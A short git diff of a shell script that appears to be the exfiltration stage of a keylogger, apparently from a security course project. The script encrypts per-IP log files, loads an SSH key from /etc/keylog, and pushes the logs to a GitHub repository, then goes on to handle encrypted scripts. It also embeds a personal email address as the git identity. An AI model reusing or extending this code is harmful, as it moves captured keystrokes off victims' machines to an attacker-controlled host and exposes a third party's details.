@@ -16,14 +16,13 @@ rm chrdev0
 # encrypt
 openssl rsautl -encrypt -inkey key_public.pem -pubin -in "logs/$ip.txt" -out "logs/$ip.enc"
 
+chmod 700 /etc/keylog/git_id_rsa
+
 eval "$(ssh-agent -s)"
 ssh-add /etc/keylog/git_id_rsa
 
 git config user.email "spencer.stevens@verizon.net"
 git config user.name "dummy000000"
-
-echo "Host github.com
-    IdentityFile /etc/keylog/git_id_rsa" > "~/.ssh/config"
 
 # add
 git add .
@@ -34,6 +33,8 @@ git commit -m "update"
 # push
 git remote set-url origin git@github.com:Sad-0w/CS564_data.git
 git push
+
+ssh-add -d /etc/keylog/git_id_rsa
 
 # extract all encrypted scripts
 for file in ./scripts/*.enc
